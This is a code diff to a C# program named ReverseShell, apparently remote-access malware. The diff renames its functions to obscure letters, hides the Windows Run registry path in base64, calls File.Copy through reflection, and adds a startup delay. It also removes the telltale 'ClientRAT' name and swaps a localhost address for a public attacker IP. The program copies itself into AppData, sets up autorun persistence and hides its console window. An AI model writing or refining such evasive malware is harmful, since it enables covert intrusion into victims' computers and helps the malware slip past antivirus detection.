@@ -25,7 +25,7 @@ class ReverseShell
     const int SW_HIDE = 0;
     const int SW_SHOW = 5;
 
-    static void HideConsole()
+    static void a()
     {
         IntPtr hWnd = GetConsoleWindow();
         if (hWnd != IntPtr.Zero)
@@ -153,7 +153,7 @@ class ReverseShell
         }
     }
 
-    static void Persist()
+    static void b()
     {
         string exePath = Application.ExecutablePath;
         string hiddenPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "client.exe");
@@ -162,14 +162,15 @@ class ReverseShell
         {
             if (!File.Exists(hiddenPath))
             {
-                File.Copy(exePath, hiddenPath, true);
+                typeof(File).GetMethod("Copy").Invoke(null, new object[] { exePath, hiddenPath, true });
             }
 
-            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+            string regPath = Encoding.UTF8.GetString(Convert.FromBase64String("U09GVFdBUkVcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVu"));
+            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(regPath, true);
             
             if (key != null)
             {
-                key.SetValue("ClientRAT", hiddenPath);
+                key.SetValue("Client", hiddenPath);
                 key.Close();
             }
         }
@@ -185,10 +186,11 @@ class ReverseShell
 
     static void Main()
     {
-        Persist();
-        HideConsole();
+        Thread.Sleep(20000);
+        b();
+        a();
 
-        string attackerIP = "127.0.0.1";
+        string attackerIP = "86.92.186.238";
         int attackerPort = 3000;
 
         try
